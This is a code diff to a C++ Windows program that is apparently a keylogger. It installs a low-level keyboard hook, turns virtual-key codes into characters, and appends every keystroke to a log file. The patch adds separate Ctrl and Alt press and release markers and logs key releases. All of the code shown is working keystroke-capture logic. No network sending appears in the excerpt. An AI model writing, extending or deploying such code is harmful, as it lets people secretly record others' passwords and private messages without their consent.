@@ -5,7 +5,14 @@
 
 // tracks modifier keys that create shortcuts, but do not alter the way the output looks
 // displays as such: [ALT_DOWN]A B C D E F G[ALT_UP]
-std::map<int, std::pair<std::wstring, std::wstring>> shortcutKeys;
+std::map<int, std::pair<std::wstring, std::wstring>> shortcutKeys = {
+    {VK_CONTROL, std::make_pair<std::wstring, std::wstring>(L"[CTRL_DOWN]", L"[CTRL_UP]")},
+    {VK_LCONTROL, std::make_pair<std::wstring, std::wstring>(L"[CTRL_DOWN]", L"[CTRL_UP]")},
+    {VK_RCONTROL, std::make_pair<std::wstring, std::wstring>(L"[CTRL_DOWN]", L"[CTRL_UP]")},
+    {VK_MENU, std::make_pair<std::wstring, std::wstring>(L"[ALT_DOWN]", L"[ALT_UP]")},
+    {VK_LMENU, std::make_pair<std::wstring, std::wstring>(L"[ALT_DOWN]", L"[ALT_UP]")},
+    {VK_RMENU, std::make_pair<std::wstring, std::wstring>(L"[ALT_DOWN]", L"[ALT_UP]")},
+};
 
 // maps keys that are hidden behind the SHIFT layer
 std::map<wchar_t, wchar_t> layeredKeys = {
@@ -36,12 +43,6 @@ std::map<int, std::wstring> mapSpecialKeys = {
     {VK_RETURN, L"[ENTER]"},
     {VK_SPACE, L"_"},
     {VK_TAB, L"[TAB]"},
-    {VK_CONTROL, L"[CONTROL]"},
-    {VK_LCONTROL, L"[CONTROL]"},
-    {VK_RCONTROL, L"[CONTROL]"},
-    {VK_MENU, L"[ALT]"},
-    {VK_LMENU, L"[ALT]"},
-    {VK_RMENU, L"[ALT]"},
     {VK_LWIN, L"[WIN]"},
     {VK_RWIN, L"[WIN]"},
     {VK_ESCAPE, L"[ESCAPE]"},
@@ -209,11 +210,11 @@ void setLogFile(){
 wchar_t formatKey(wchar_t key){
     // handles the transforming of keys that are modified using the SHIFT and capslock keys
 
-    if(isalpha(key))
-        return (caseStatus.first ^ caseStatus.second) ? key: tolower(key);
-    
-    
-    if(caseStatus.first) {
+    if (isalpha(key))
+        return (caseStatus.first ^ caseStatus.second) ? key : tolower(key);
+
+
+    if (caseStatus.first){
         auto layeredKeyEntry = layeredKeys.find(key);
         return (layeredKeyEntry == layeredKeys.end()) ? key : layeredKeyEntry->second;
     }
@@ -221,26 +222,36 @@ wchar_t formatKey(wchar_t key){
     return key;
 }
 
-void logKeystroke(int vkCode){
+void logKeystroke(int vkCode, bool keyReleased = 0){
     // KBDLLHOOKSTRUCT stores the keyboard inputs as Virtual-Key codes
     // resolution and logging of the keystrokes is performed here
     // also ignores mouse inputs
 
     std::wstringstream output;
 
-    if (mapSpecialKeys.find(vkCode) != mapSpecialKeys.end()){
-        std::wstring key = mapSpecialKeys.at(vkCode);
+    if (shortcutKeys.find(vkCode) != shortcutKeys.end()){
+
+        std::pair<std::wstring, std::wstring> keyPair = shortcutKeys.at(vkCode);
+        std::wstring key = (keyReleased) ? keyPair.second : keyPair.first;
 
         output << key;
     }
-
     else{
-        HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());
+        if (keyReleased)
+            return;
+        if (mapSpecialKeys.find(vkCode) != mapSpecialKeys.end()){
+            std::wstring key = mapSpecialKeys.at(vkCode);
 
-        wchar_t key = MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout);
-        key = formatKey(key);
+            output << key;
+        }
+        else{
+            HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());
 
-        output << key;
+            wchar_t key = MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout);
+            key = formatKey(key);
+
+            output << key;
+        }
     }
 
     logFileMutex.lock();
@@ -284,6 +295,8 @@ LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam){
                 caseStatus.first = 0;
                 return 1;
             }
+
+            logKeystroke(vkCode, 1);
         }
     }
 
